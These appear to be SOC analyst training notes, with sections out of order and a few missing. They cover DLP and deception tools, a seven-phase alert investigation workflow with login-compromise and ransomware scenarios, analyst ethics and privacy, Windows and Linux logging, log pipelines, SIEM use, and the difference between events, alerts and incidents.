    • Classification-driven DLP — documents are tagged Public / Internal / Confidential / Highly Confidential, and policy enforcement (can it be emailed externally? uploaded to personal cloud?) is driven automatically by that tag, with AI-assisted auto-classification of PII / financial / trade-secret content.
    • Behavioral DLP — combines DLP with UEBA to catch patterns, not single violations: a user's upload volume escalating from 2× to 20× their baseline across a week (especially correlated with an HR resignation record or an updated job-board profile) triggers escalating alerts and, at the top tier, an automatic block plus security / HR / legal notification.
    • Encrypted-traffic handling — either SSL / TLS inspection (DLP decrypts, scans, re-encrypts as a man-in-the-middle) or endpoint DLP (scans data before it's ever encrypted, at the source).
  10. 10.10

    Additional Advanced Detection Tools
    • Network Traffic Analysis (NTA) platforms (Darktrace, ExtraHop, Vectra, Cisco Stealthwatch) do ML-driven behavioral baselining even over encrypted traffic — e.g., spotting C2 beaconing by its unnaturally regular timing / packet-size pattern versus normal HTTPS traffic's randomness.
    • Certificate Transparency monitoring (CertStream, crt.sh, etc.) watches public CT logs for newly issued certificates containing your brand name, catching typosquat / impersonation phishing domains (yourcompany-login.com) as soon as they get a certificate.
    • Dark web monitoring (Recorded Future, Digital Shadows, Flashpoint, or free tools like Have I Been Pwned) watches forums, paste sites, Telegram / Discord, and breach databases for your domain, employee emails, leaked credentials, or data-for-sale listings.
    • LOLBins detection specifically targets abuse of legitimate built-in tools (PowerShell, WMI, WMIC, PsExec, certutil) that traditional AV won't flag since the tools themselves are legitimate — requiring Sysmon, EDR command-line analysis, or SIEM correlation instead.
  11. 10.11

    Deploying by Maturity Level
    • Level 1 (basic SOC — SIEM / EDR / firewall / AV) — add canary tokens first (free, 1-day deploy, zero false positives) and a basic honeypot (e.g. Cowrie SSH in the DMZ).
    • Level 2 (intermediate) — add a UEBA pilot (starting with high-risk users), upgraded / content-aware DLP, and more honeypots.
    • Level 3 (advanced) — add a commercial deception platform (Attivo / TrapX / Illusive), NTA, an insider-threat platform, memory-forensics capability, and formal active-defense tactics.

    Track effectiveness with concrete metrics (tokens deployed / triggered / true-positives, MTTD via canaries, UEBA anomalies / confirmed threats, DLP blocks / false-positive rate, honeypot connection attempts / unique attacker IPs).

    Common mistakes to avoid: deploying without a plan, "set and forget" (deception needs ongoing maintenance and tuning), skipping legal review (active defense has legal implications — get sign-off and document defensive intent), over-relying on automation instead of using tools to augment human judgment, and never tracking metrics / ROI.

The Complete Toolkit Workflow

  1. 11.1

    The Reality of a Shift

    Knowing each tool individually isn't the same as knowing which tool to reach for and in what order when a real alert lands — that's the gap this section closes.

    The reality of a shift is high-volume and time-pressured: efficiency genuinely determines whether an analyst keeps up (10 min/alert → ~48 alerts / shift, sustainable) or falls behind (20 min/alert → ~24 alerts / shift, backlog grows).

  2. 11.2

    Why Ad-Hoc Investigation Fails

    An unstructured analyst wanders between tools, gets distracted, and after 30 minutes produces a vague ticket ("investigated login alert, seems okay"); a structured analyst following a framework and checklist reaches a clear, evidenced answer in 5 minutes.

  3. 11.3

    The Investigation Framework — 7 Phases

    1. Triage

      What is the alert, severity, real or false positive, priority?

    2. Initial Assessment

      Quick context — has this happened before? isolated event, a known recurring false-positive pattern, or a widespread outbreak across many endpoints? — primarily via SIEM history search.

    3. Enrichment

      IOC reputation, user / asset context, risk scoring, via TIP, AD, asset DB / CMDB, and prior-incident history. A clean result here closes the alert as a false positive with documented reasoning; a "likely malicious" result proceeds to deeper investigation.

    4. Investigation

      Deeper analysis — exact timeline, scope, affected data / systems, still-ongoing or contained — via SIEM (chronological event sequencing), network logs (firewall / proxy for C2 / exfil), and EDR (process tree, command-line arguments, file / registry / network changes). Completed checklist: timeline established, scope determined (endpoints / users / systems affected), IOCs identified, impact assessed (data accessed / exfiltrated, lateral movement, privilege escalation), and evidence collected (screenshots, log exports, memory dump, malware sample where applicable).

    5. Containment

      Endpoint containment (EDR isolation, kill process, quarantine, preserve evidence first), network containment (block IP at firewall, sinkhole domain, block URL at proxy), account containment (disable, revoke sessions, reset password, force MFA re-auth). Containment decision matrix — malware detected → isolate / kill / quarantine / block C2; account compromised → disable / revoke / reset / check for lateral movement; data exfiltration → block destination / isolate / disable / alert DLP; ransomware → immediate isolation without waiting, block IPs, alert all teams, activate the IR plan.

    6. Documentation

      The completed, evidenced ticket.

    7. Monitoring

      Immediate follow-up (hunt for the same IOCs elsewhere, monitor endpoints), short-term (verify blocks are working, check for variants, confirm no lateral movement), and long-term (lessons learned, updated detection rules, user training, trend analysis).

    Efficient Tool-Pivoting (Cheat Sheet)

    Rather than closing and reopening tools one at a time and re-typing values (and risking copy-paste errors), keep a running notepad of the IOCs found so far and open all relevant tools in parallel tabs, cross-referencing results together.

    Pivot cheat sheet — what you found → where to check next:

    • Suspicious process → EDR process tree, SIEM for the same process on other endpoints, VirusTotal for the hash.
    • Unknown IP → VirusTotal / AbuseIPDB for reputation, SIEM for who else contacted it, firewall for block status, TIP for known C2 infrastructure.
    • Suspicious user activity → AD for details / groups, SIEM for baseline, UEBA for risk score, HR for insider-threat context (e.g., is this user leaving the company).
    • Unknown file hash → VirusTotal, TIP, EDR for other sightings, sandbox if genuinely unknown.
    • Unusual login → SIEM baseline, AD, UEBA score, Geo-IP, VPN logs for legitimate travel.
  6. 11.6

    Worked Scenario 1 — Suspicious Login (account compromise via stolen session cookie)

    An alert for a login from Russia at business hours with MFA marked "bypassed."

    1. Phase 1 — Triage

      Triaged as medium-high priority — login from Russia during business hours, MFA marked "bypassed."

    2. Phase 2 — Initial Assessment

      Check the user's 30-day baseline (always New York / occasionally Chicago, always MFA, two known devices, zero prior Russia logins) against the current alert (new country, unknown device, no MFA) — yields three clear anomalies.

    3. Phase 3 — Enrichment

      Source IP has an abuse history (scanning, brute force) though not definitively malicious; confirmed the user has no scheduled travel and should be in the office; login device is completely unrecognized.

    4. Phase 4 — Investigation

      Found impossible travel — a legitimate New York login 15 minutes before the Russia login, which is physically impossible — confirming compromise. Full SIEM timeline shows the attacker read / exported emails, exported a 2,500-contact customer list from Salesforce, downloaded proposal files, and set up an external email-forwarding rule for persistence, all within about 9 minutes and still ongoing. The authentication detail "MFA previously satisfied" reveals the actual root cause: a stolen session cookie (likely via phishing) let the attacker bypass MFA entirely rather than needing the password. Scope check shows several other users received failed login attempts from the same IP but only this one account was actually breached — a targeted, not brute-force, attack.

    5. Phase 5 — Containment

      Disable account, revoke all sessions, remove the forwarding rule, reset password, block the IP, call the user — happens before full forensics are finished, deliberately prioritizing stopping the ongoing theft.

    6. Phase 6 — Documentation & IR Handoff

      Case documented with full timeline, evidence, and containment actions taken; escalated to Incident Response for breach assessment.

    7. Phase 7 — Monitoring

      Immediate: IOC / phishing-email hunting. Short-term: dark-web and other-victim monitoring plus a legal / compliance breach assessment (2,500 customers potentially affected). Long-term: security-awareness training, an MFA / conditional-access policy review, and a phishing simulation for the affected team.

  7. 11.7

    Worked Scenario 2 — Ransomware

    Because ransomware is always Critical and time-sensitive, the analyst skips the normal Phase 2 / 3 (assessment / enrichment) entirely and goes straight to emergency containment.

    1. Phase 1 — Triage / Emergency Containment

      Isolate the endpoint via EDR, kill the malicious process, remove its persistence so it can't restart, block the C2 IP, and alert the team — all within about 90 seconds of detection.

    2. Phase 2 — Scope Assessment

      Only after the bleeding is stopped: SIEM confirms no lateral movement (a single outbound connection, only to the C2, before isolation), the file server is untouched (all-read activity, no encrypted files), EDR shows exactly which local files were encrypted (.docx / .xlsx / .pdf → .locked, including sensitive HR data), backups are confirmed available (minimal, ~1 hour of data loss), and an EDR hash search confirms no other endpoint is infected.

    3. Phase 3 — Investigation (Root Cause)

      Root cause traces to a phishing email with a malicious ZIP / EXE attachment. Full EDR timeline reconstructs the exact minute-by-minute kill chain from the user opening the attachment through the dropped payload, registry persistence, first C2 beacon, first files renamed, and the moment EDR behavioral detection and SOC containment fired.

    4. Phase 4 — Intelligence

      VirusTotal and threat-intel checks identify the sample as part of an active LockBit campaign delivered via a common phishing vector.

    5. Phase 5 — Documentation & IR Handoff

      Case documented and formally handed off to the IR team with preserved evidence (isolated endpoint, ransom note, EDR timeline) and full documentation (IOC list, backup verification).

    6. Phase 6 — Ongoing Monitoring

      Hunt the IOCs elsewhere, watch the C2 IP, search other mailboxes for the same phishing email, watch for any further LockBit behavior pattern.

  8. 11.8

    Your SOC Analyst Toolkit
    • Core tools — SIEM, EDR, SOAR, TIP, ticketing.
    • Intelligence tools — VirusTotal, AbuseIPDB, URLScan.io, WHOIS, Shodan.
    • Efficiency tools — a notes app like Obsidian, a password manager, a clipboard manager, a text expander, investigation / ticket templates, query cheat sheets.
    • Frameworks — the 7-phase investigation methodology, MITRE ATT&CK, the Cyber Kill Chain, the organization's IR plan.
    • Skills — query languages like SPL / KQL, Windows / Linux log analysis, packet analysis, basic malware behavior knowledge, threat-intel context-building, and clear documentation.
  9. 11.9

    Key Principles to Remember
    • Methodology over memory — don't memorize every case, systematize the process; a framework and checklists ensure consistency and prevent missed steps.
    • Tools are force multipliers — learn them deeply, integrate workflows, automate the repetitive parts.
    • Context is everything — raw data only becomes intelligence once you know who / what / where / when / why, and business impact should drive priority.
    • Speed with accuracy — fast matters, but accurate matters more; templates and practice build both.
    • Document everything — if it isn't documented, it didn't happen, and future-you (plus Legal / IR) will need those notes.
    • Escalate appropriately — know your limits and route the right problem to the right team (Tier 1 → Tier 2 → IR → Legal).
    • Continuous improvement — learn from every incident, update your templates, share knowledge, get a little better every day.

Ethical Use of SOC Tools

  1. 12.1

    Why Ethics Matter

    A SOC analyst's technical access routinely exceeds that of most employees, some executives, HR, or Legal — you can read emails, browsing history, personal files, private messages, location data, and financial transactions; whether you should, must report, or can discuss those findings are three separate questions with very different answers, and only rarely is the answer "yes" to any of them without a clear investigative reason.

  2. 12.2

    Authorization — Two Layers
    • Legal — laws like the CFAA, applying to everyone.
    • Organizational — your company's Acceptable Use Policy and employment agreement, which is often stricter than the law — a policy violation can mean termination even if nothing illegal occurred.

    As a SOC analyst you're typically authorized to: use security tools for legitimate investigations during your shift, within your role's scope, and access user data if it's necessary for that specific investigation and approved for sensitive cases.

    You're typically NOT authorized to: browse out of personal curiosity, access data beyond the alert's scope (a malware alert is not blanket permission to read all of someone's email), share findings outside the security team, use tools for non-security personal purposes, or retain "interesting" data you happen to find.

  3. 12.3

    The "Need to Know" Principle

    Access only what the specific investigation requires — for a malware alert, that's the malware itself, the executing process, affected files, and network connections; it is not the user's unrelated personal emails, browsing history, or private messages.

    If you stumble across something sensitive and irrelevant: stop reading, don't screenshot or save it, don't discuss it with anyone, document only what's relevant, and report to a supervisor if something genuinely concerning surfaced.

    Red flags that should make you stop and escalate rather than comply:

    • A non-security colleague asking you to "just look something up" for them.
    • Personal curiosity about a coworker.
    • Requests from friends / family.
    • Any request that makes you uncomfortable.
  4. 12.4

    Practical Privacy Guidelines
    • Minimize what you collect — search for the specific IOC, not "everything," and filter to the relevant time window.
    • Protect what you do collect — avoid unnecessary PII screenshots, redact when sharing, encrypt sensitive files.
    • Limit sharing strictly to need-to-know team members.
    • Delete temporary files / archives once the investigation is done per retention policy.
    • Always document why you accessed something.
    • Take extra care around especially sensitive categories: health data, genetic data, biometric data, and racial / political / religious / sexual-orientation information.
  5. 12.5

    Corporate Policy

    Corporate policy is frequently stricter than law, and violating it can mean termination even without any illegality — key policies include the Acceptable Use Policy, Security Policy, Data Classification Policy (Public / Internal / Confidential / Restricted, since investigations routinely touch Confidential / Restricted data), Privacy Policy, Code of Conduct, and Incident Response Policy.

    Common real violations:

    • Discussing an incident casually outside work.
    • Using a SIEM to satisfy personal curiosity about someone.
    • Hoarding "interesting" case copies past retention.
    • Failing to report discovered misconduct.
    • Inadequate documentation that can't later demonstrate compliance.

    When in doubt, escalate to a supervisor — there's no such thing as a stupid question here.

  6. 12.6

    Handling PII Specifically
    • Collect only what's necessary — data minimization.
    • Protect it properly — no unnecessary screenshots, no pasting into unsecured docs, no unencrypted email, no leaving it visible on an unattended screen.
    • Share it strictly need-to-know — teammates on the same case, a supervisor when escalating, Legal / HR if required — never casual colleagues or group chats.
    • Log every access — date / time / what / why / who.
    • Delete it once the investigation closes per the retention window (usually 30–90 days), except where it's needed as evidence for legal proceedings.

    Data minimization in practice, contrasted:

    • Bad — pulling "all of this user's data" for a login investigation means ~50 GB, 99% irrelevant, hours to review, and a serious privacy overreach.
    • Good — pulling only what the specific login alert actually needs (timestamp, source IP, device, MFA status, 30-day login history, approximate location) means ~1 MB, fully relevant, minutes to review, and sufficient to make the decision.
  7. 12.7

    SOC Analyst Code of Conduct

    Law is the minimum standard; ethics is the higher one you should actually hold yourself to — be trustworthy, act with integrity even unwatched, protect confidentiality, serve the organization's interests rather than personal curiosity, and help advance the profession.

    Avoiding conflicts of interest means recognizing situations where personal stakes could bias your judgment (investigating a close friend, investigating your own manager) and disclosing / requesting reassignment rather than proceeding compromised.

    Core principles to remember:

    • Authorization is not the same as permission — technical access ≠ being authorized to use it.
    • Document everything — why / what / when — the audit trail protects you and the organization.
    • Need-to-know, not nice-to-know.
    • When in doubt, escalate.
    • Privacy is a real right even at work and even on company systems.
    • The law is the floor, not the ceiling — aim for ethical, not merely legal.

Logging Fundamentals

  1. 1.1

    Logging Introduction

    Logging = the automatic recording of system and application events on a device, server, or network — capturing the who / what / when / where of activity (a firewall blocking a connection, a user login, a file being opened / modified).

    Why logging exists — 5 core purposes:

    • Auditing — track user actions / system changes for accountability.
    • Troubleshooting — diagnose software / hardware failures.
    • Behavior Monitoring — understand normal vs. anomalous activity.
    • Security Monitoring — detect unauthorized access / malicious activity.
    • Compliance — meet regulatory requirements like HIPAA, PCI-DSS.

    Without logs, detecting incidents and finding root cause would be nearly impossible.

    Why logging is critical: logs help identify port scans, brute-force attacks, DoS attacks, account compromises, system errors, and almost any security issue; they support real-time alerting / reporting and serve as historical / forensic evidence.

    Logs in the SOC: they feed SIEMs and other detection systems, and analysts use them throughout the whole workflow — initial triage, investigation, response, remediation, reporting. Logs are the foundation everything else in the SOC is built on.

  2. 1.2

    Log Sources & Types
    • Access Logs — who attempted to access what, from where, when; fields include account info, success / fail, source device / IP, destination, access type, timestamp.
    • Network Logs — generated by network infrastructure / monitoring tools for traffic visibility. Common sources: firewall logs (allow / deny, NAT), IDS / IPS (Snort, Suricata), NetFlow / IPFIX, packet captures (PCAPs), VPN / DHCP / DNS / proxy logs. Fields: source / destination (IP, port, geolocation), traffic type / protocol, application-layer info, rule matches.
    • Security Control Logs — from any dedicated security device (firewall, IPS, DLP); track control type, source / destination, action taken (blocked / alerted / manual), the decision reasoning, and the triggered rule.
    • Operating System Logs — from individual workstations / servers / devices.
      • Windows: Security (logins, privileged use), System (services, devices), Application (software events).
      • Linux: journal / syslog (auth logs, service / kernel logs).
    • Storage / File Server Logs — tracks all file / file-share access (cloud and local, including backups): who accessed, what (full path), result (success / fail + why), access type (read / modify / create / delete), with extra alerting on "unusual" access that might indicate malware / ransomware.
    • Other sources — application logs (web servers, databases, email), cloud services (AWS / Azure / GCP), OT / IoT devices, physical security systems (badge access, cameras).

    Correlation across sources is what turns individual logs into full context — e.g., OS logs identify malware executed on a workstation, network logs detect outbound traffic to a known-malicious IP, and access / application logs trace a login from an unusual location or time; combining all three tells the full story.

  3. 1.3

    Windows Event Logging

    A built-in Windows mechanism recording system activity, application behavior, security events, and OS operations — critical for auditing, troubleshooting, and security monitoring.

    How it works (4 steps):

    1. Event Generation

      Any action (login, service start, file modified) generates an event with a unique Event ID, timestamp, source, severity level (Information / Warning / Error / Critical), and event data.

    2. Event Logging Service

      The Windows Event Log service (eventlog) writes events to .evtx files in C:\Windows\System32\winevt\Logs\.

    3. Storage & Retention

      Each log type (Security, System, Application, etc.) gets its own .evtx file; rotation / archiving / overwriting is configurable.

    4. Accessing Logs

      Via Event Viewer GUI (eventvwr.msc), PowerShell (Get-WinEvent, Get-EventLog), CLI (wevtutil), or SIEM ingestion.

    Types of Windows Event Logs:

    1. Security — access / login / logout, account management, privilege use; governed by audit policies. Common Event IDs: 4624 (successful logon), 4625 (failed logon), 4670 (permissions changed), 4688 (process created).
    2. System — logged by system components / drivers (kernel, services); useful for hardware / OS troubleshooting. Common sources: Service Control Manager, Ntfs, Kernel-General.
    3. Application — written by user-mode apps (errors, warnings, custom logging); example sources: MSExchange, .NET Runtime, SQLServer.
    4. Setup — installation-related logs (Windows Updates, setup components).
    5. Forwarded Events — centralized collection from remote Windows systems via Windows Event Forwarding (WEF) and a subscription manager.
    6. Additional (Microsoft / 3rd-party) logs — Sysmon (deep process / network / driver monitoring), Windows Defender, PowerShell Operational, Terminal Services.

    Use cases for SOC analysts: user behavior monitoring (login patterns, unauthorized access), process tracking (suspicious execution), privilege abuse detection (admin group changes, token abuse), lateral movement tracing (RDP / WinRM), persistence discovery (scheduled tasks, service installation).

  4. 1.4

    Linux Logging

    Linux logging records events / messages / activity via a combination of text-based log files, logging daemons, and kernel-level messages.

    How it works (4 steps):

    1. Event Generation

      System-level messages (service start / stop, kernel messages), application output, or security-related activity (login attempts).

    2. Logging Daemons

      Route / store events: rsyslog (default on most modern distros), syslog-ng, journald (systemd-based systems); handle formatting, priority / severity tagging, and routing.

    3. Storage & Formatting

      Plain text files under /var/log/: /var/log/auth.log (authentication), /var/log/syslog (general activity), /var/log/kern.log (kernel), /var/log/messages (general, non-systemd).

    4. Accessing Logs

      cat / less / tail to view, grep / awk to search / filter, journalctl for the systemd journal (e.g. journalctl -xe, tail -f /var/log/auth.log).

    Types of Linux log files:

    1. Authentication logs (/var/log/auth.log, /var/log/secure) — login attempts, SSH access, sudo usage; detect brute force, privilege escalation, unauthorized logins.
    2. System logs (/var/log/syslog, /var/log/messages) — general system / daemon activity; spot service crashes, errors, reboots.
    3. Kernel logs (/var/log/kern.log) — hardware errors, driver issues.
    4. Application logs — varies, e.g. /var/log/apache2/access.log, /var/log/mysql/error.log.
    5. Audit logs (auditd, /var/log/audit/audit.log) — granular system-call / file-access / user-activity tracking for compliance and forensics.
    6. Systemd Journal (journald / journalctl) — centralized binary journal of kernel logs, service logs, auth events.

    Use cases: brute-force detection (auth.log), malware behavior (syslog / messages / journalctl), root access tracking (auth.log, audit.log), lateral movement (SSH logs), data exfiltration scripts (custom / process auditing).

    Why it matters: Linux logs give deep visibility into system behavior, are critical for forensics / audit trails / compromise detection, and are lightweight / customizable enough to centralize into a SIEM.

The Logging Pipeline

  1. 2.1

    Logging Lifecycle

    Understanding where logs come from and where they go speeds up initial analysis, helps trust the data, provides investigative context, and helps a Tier 1 analyst spot gaps / missing information quickly — seeing the "whole picture."

    Lifecycle stages: Generation → Transmission / Shipping → Normalization → Storage → Analysis → Retention & Retirement.

    Centralized logging pipeline — the architecture / process by which logs from diverse systems are collected, transported, processed, stored, and analyzed centrally (typically a SIEM like Splunk or a log-analytics platform like ELK) — essential for incident detection, threat hunting, auditing, and forensics.

    8 core pipeline components:

    1. Log Generation (sources)

      Systems that produce log data.

    2. Log Collection (agents / forwarders)

      Gather log data from those sources.

    3. Log Shipping (transport layer)

      Move logs from source to central platform.

    4. Log Aggregation & Ingestion

      Consolidate logs on arrival.

    5. Log Parsing & Normalization

      Convert raw logs to structured, standardized fields.

    6. Storage & Indexing

      Organize logs for fast querying.

    7. Analysis & Visualization

      Explore, correlate, and visualize.

    8. Alerting & Response

      Notify and trigger action on detections.

  2. 2.2

    Log Collection

    The process of gathering log data from endpoints, network devices, applications, and security tools, to centralize visibility and support monitoring / analysis / alerting.

    Logs are either pulled (queried on demand) or pushed (sent automatically); collection is agent-based (Filebeat, Winlogbeat) or agentless (syslog); logs may be raw or parsed / normalized on ingestion.

    Push-based: source system actively sends logs (agent forwards over TCP / UDP / Beats / HTTP; receiver is passive). Examples: rsyslog pushing to a remote server, Winlogbeat pushing to ELK, a firewall pushing via syslog. Benefits: near real-time, minimal central config. Challenges: source must be trusted, silent delivery failures possible.

    Pull-based: central system requests logs on a schedule / trigger (via SSH, WMI, API, shared folders). Examples: SIEM pulling via WMI, pulling Apache logs over SSH / SCP, SNMP / API collection. Benefits: centralized control, works for agent-incompatible legacy systems. Challenges: higher network load, latency from pull intervals, needs secure reliable access.

    Agent-based: a lightweight agent on the host reads logs / system APIs in real time, formats / forwards them (e.g. JSON), and can enrich / tag before shipping. Examples: Filebeat, Winlogbeat, NXLog / Sysmon. Benefits: efficient, real-time, resilient (local buffering / retry), can enrich / filter. Challenges: requires install / maintenance on every endpoint, may raise concerns in locked-down environments.

    Agentless: relies on native protocols / open ports (WMI, SSH, syslog, API polling) instead of installed software. Examples: WMI log collection from Windows, syslog from network devices, REST API queries to a web app's audit logs. Benefits: no agent overhead, easier under strict software policy. Challenges: less reliable / slower, may miss transient logs, harder to secure / scale.

  3. 2.3

    Log Shipping

    Transferring collected logs from the source to a centralized platform / SIEM (ELK, Splunk).

    Importance: enables centralized analysis / correlation, prevents log tampering on compromised systems, supports real-time alerting, ensures long-term storage / compliance.

    Collection vs. Shipping:

    AspectLog CollectionLog Shipping
    PurposeGather logs from local / system sourcesSend logs to centralized platform
    ExamplesAuditd, journald, Event ViewerFilebeat, Winlogbeat, rsyslog, syslog-ng
    DestinationLocal store / temp bufferLogstash, Elasticsearch, Splunk, SIEM
    TransportN/A (local)Syslog, Beats, Kafka, HTTP API, TCP / UDP

    Common shipping tools: Filebeat (Linux, flat log files), Winlogbeat (Windows event logs), rsyslog / syslog-ng (Linux, syslog format), Logstash (cross-platform, parse / enrich / forward), NXLog (Windows, custom logs), Fluentd (cross-platform, plugin-based).

    Security best practices: TLS encryption in transit, local buffering to prevent data loss during downtime, authentication / signature verification where supported, and separating log-collection infrastructure from production systems.

  4. 2.4

    Log Aggregation

    Collecting / combining log data from multiple sources into one centralized system for search, correlation, analysis, and monitoring — the consolidation phase of the pipeline, essential for situational awareness.

    Since modern environments generate scattered logs in different formats / locations, aggregation unifies them, enabling responders to view everything in one place, correlate across systems, detect cross-host / network patterns, and speed up investigations.

  6. 2.6

    Log Collection & Centralization

    Centralized logging gives a single destination and typically one dashboard for all logs; benefits include one place for all logs, the ability to introduce automation / alerting (including automatic countermeasures), correlated analysis (manual or automated), and — importantly — it makes it harder for attackers to alter / delete logs, since offloaded logs are protected from a compromised source system.

    Collection methods: push vs. pull, agent vs. agentless; real-time collection for critical systems (enables timely alerts / automation) vs. scheduled shipments for lower-tier systems (useful for IR but not critical for real-time alerting); time synchronization is critically important throughout.

    Push vs. Pull, in practice:

    • Push = system sends logs to a central server (syslog / FTP / HTTP API / vendor-specific), can be real-time or scheduled, usually used for the most critical data.
    • Pull = log server connects and downloads, usually in scheduled batches.

    For the most critical logs, push is preferred — e.g. file-system access logs (protect against exfil / ransomware) and authentication logs (alert on brute force / spraying).

    Agent vs. Agentless comparison:

    • Agent = installed software package, typically real-time pushed shipment, fastest collection, availability depends on the logging system.
    • Agentless = usually pull methods (may use native push like FTP / syslog), speed depends on source / method.

    Aggregation and Correlation: aggregation = collecting all logs in one place; correlation = comparing logs to establish connections / common information. Correlation starts with normalization; the SIEM (or equivalent) analyzes all collected data together, so all log data being on one system allows logs to be analyzed against each other — producing better intelligence than any standalone log source alone.

Log Analysis & SIEM

  1. 3.1

    Basic Log Interpretation & Analysis

    Analysis = examining collected data to draw conclusions and build actionable intelligence (manual and / or automated) — taking correlated data from multiple systems, cross-checking logs against each other, and building a timeline of what occurred: what happened, when, from / to where, what the impact is, and creating IOCs. The goal is a full picture that tells the story.

    "Build a story": logs provide evidence; analysts assemble the timeline, events, and who was involved. Most true "storytelling" happens at Tier 2+, but Tier 1 analysts start the process — determining whether there is a story to tell.

    What's in a log: timestamp, event ID / code, source / destination, user / account, process, action, message.

    Initial analysis flow (5 steps):

    1. Normal or Suspicious?

      Filter noise from signal; requires understanding what "normal" looks like in this environment; spot anomalies without over-analyzing.

    2. Understand the Context

      What else is happening in the logs? Any trends or high-profile attacks to be aware of?

    3. True Positive vs. False Positive

      True positive = alert correctly identifies malicious activity; false positive = alert flags something as malicious that isn't.

    4. Pivot & Watch for Patterns

      Some patterns are easier to spot than others; pivoting means starting with one suspicious event and checking related logs for additional context.

    5. Remember Timestamps

      Build a sequence of events (a story), e.g. firewall event → login attempts → login success → process execution — which helps distinguish an isolated event from a larger incident.

    Actionable Intelligence = informative data from log analysis that guides next steps, used to build mitigation strategies / countermeasures; it's built from in-depth, correlated, multi-log analysis that tells the full story of an event — the key distinction is that it's actionable, not just raw information.

  2. 3.2

    Log Analysis Tools

    Why tools matter: logs are high-volume and low direct usability on their own; tools collect logs in one location, allow easy searching, provide dashboards / alerts / automation, and even AI summarization — SOC analysts rely on their tools daily far more than on raw logs.

    Tool types:

    • SIEM platforms
      • Paid — Splunk, LogRhythm, Sentinel, QRadar.
      • Free / open-source — ELK / Elastic Stack, Wazuh, Security Onion.
    • Cloud logging — mostly proprietary to the platform (AWS CloudWatch, Azure Monitor).
    • Analysis tools — typically used directly on raw logs: Wireshark, PowerShell / Python (scripting), grep.

    Supplementing log data: tools automatically enrich logs (threat intel, internal asset info, geolocation), but sometimes more is needed than the SIEM provides — OSINT, paid threat-intel feeds, internal resources — and any additional info gathered should always be included in the ticket.

    Analyst's role with tools, by level:

    • L1 — basic SIEM searching (sometimes with pre-defined queries), results filtering, pre-configured dashboards, and documentation.
    • L2+ / IR / Hunters — packet analysis with Wireshark, write correlation / detection rules, use scripting languages for detection / hunting, and use memory forensics tools.

It combines two capabilities: SIM (Security Information Management — historical data analysis / log management) + SEM (Security Event Management — real-time monitoring / alerting) = SIEM.

    Popular SIEM solutions:

    How a SIEM works (6 stages):

    1. Log Collection

      From Windows / Linux servers, firewalls, IDS / IPS, applications, endpoints, auth systems, cloud / on-prem infra.

    2. Normalization & Parsing

      Converts raw logs to a standard format, extracts fields (IPs, usernames, timestamps).

    3. Aggregation & Storage

      Indexed databases for fast search / reporting / auditing.

    4. Correlation & Detection

      Analyzes cross-system patterns, matches against detection rules (e.g. brute force + suspicious login = alert).

    5. Alerting & Dashboards

      Raises alerts, presents visual monitoring for analysts.

    6. Search & Investigation

      Supports deep-dive investigation, threat hunting, timeline reconstruction.

    What a SIEM is used for: Detection (real-time threats — malware, privilege abuse, C2), Log Analysis (centralized analysis across systems), Alerting (notifying analysts of high-risk events), Threat Hunting (proactive IOC searches), Compliance & Auditing (proving control effectiveness for PCI-DSS / HIPAA), Forensic Investigations (reconstructing events post-incident).

    Why SIEMs are critical:

    • Centralized Visibility — all logs in one place, cross-system correlation.
    • Fast Detection — real-time alerts reduce MTTD, triage queues prioritize.
    • Contextual Awareness — enriched alerts with user / system / location / threat-type context.
    • Investigation / Escalation / Response — timeline views, raw logs, pivoting to answer what happened / who was affected / root cause.

    Detection examples: possible brute force, excessive file copying (possible exfil), DDoS (multiple simultaneous sources), file integrity compromise (unauthorized file changes).

    SIEM automation: automation level varies by vendor; ML / AI can enhance capabilities; monitoring rules trigger alerts, and alerts can trigger actions — e.g. multiple failed logins across accounts from one IP generates an alert, and automation blocks that source IP at the firewall.

    Limitations: not all logs may be available (visibility gaps, needs configuration or signals a problem), false positives occur, complex searches over large datasets can be time-consuming, and knowing when to escalate despite missing data is an important skill.

  4. 3.4

    Dashboards & Visualizations

    Dashboards give a high-level, at-a-glance view of security posture — alert volumes, trends, source distribution — highly customizable by data source / type and desired metrics / KPIs.

    They can reveal potential issues without triggering an alert and help reduce alert fatigue through contextual awareness / prioritization, but they're only effective when actively monitored — they complement, not replace, automation / correlation / alerting.

    Dashboard elements: charts / graphs (trends over time), tables / lists (top IPs, top users with failed logins, systems with most alerts), heatmaps / geolocation maps (highlight connection origins, potential foreign attack sources), and various customizable widgets.

    Intentional dashboards are purpose-built:

    • Operational — real-time system health / activity.
    • Security Monitoring — failed logins, blocked connections, EDR detections.
    • Threat Intelligence — new feed updates, correlation against known-bad IPs / domains.
    • Compliance — retention info, baseline config verification.

Alerting & Operational Challenges

  1. 4.1

    Events, Alerts & Incidents

    Distinguishing these three terms correctly is essential — misunderstanding them leads to inefficient triage, wasted analyst time, or missed breaches.

    Events — any meaningful, observable occurrence from logs / telemetry (a single log entry, correlated entries, a normalized SIEM record). Examples: a login, a file opened / modified, a process created / terminated, a packet transmitted. Generated in huge volumes (millions / day on large networks), mostly benign, logged for auditing / troubleshooting / monitoring — "the atoms of your security telemetry."

    Alerts — a notification from a monitoring system (SIEM, IDS, AV) when a predefined rule / condition is triggered, often indicating potentially suspicious / malicious activity. Examples: login from an unauthorized country, a malware signature in memory, an unexpected Domain Admins addition, an unusually large outbound transfer. Based on detection rules / heuristics / baselines; may include false positives; require analyst triage / validation. "An alert is a signal: 'Hey, something might be wrong.'"

    Alert creation criteria:

    • Correlation rules — examining multiple entries (e.g. auth + time + IP, or failed-then-successful auth on one account).
    • Thresholds — >50 denied connections, >15 failed auths in 5 min.
    • Signatures — malware hashes / patterns.
    • Behavioral analytics — unusual login times, anomalous processes (the more advanced criterion type).

    Analyst workflow with a SIEM:

    1. Alert Received

      The signal arrives.

    2. Search Related Logs

      Query the SIEM for surrounding activity.

    3. Extract Relevant Details

      Timestamps, users, IPs, processes.

    4. Determine Next Steps

      True positive vs. false positive.

    5. Pivot to Other Data as Needed

      EDR, threat intel, asset info.

    6. Resolve / Close or Escalate

      Document the outcome either way.

    Validating alerts — worked example: "Multiple failed logins detected" alert; SIEM search shows 42 failed logins from one IP, the account is privileged, the IP is in a foreign country and flagged in threat intel → outcome: escalate as a likely brute-force attack.

    Incidents — a confirmed or suspected breach of security policy / acceptable use, determined by analyzing alerts and their associated data. Examples: ransomware encrypting multiple endpoints, unauthorized access to sensitive systems, PII exfiltration, credential theft + lateral movement. Incidents are actionable and require an IR response, can involve one or many alerts / events, and must be documented, analyzed, and remediated.

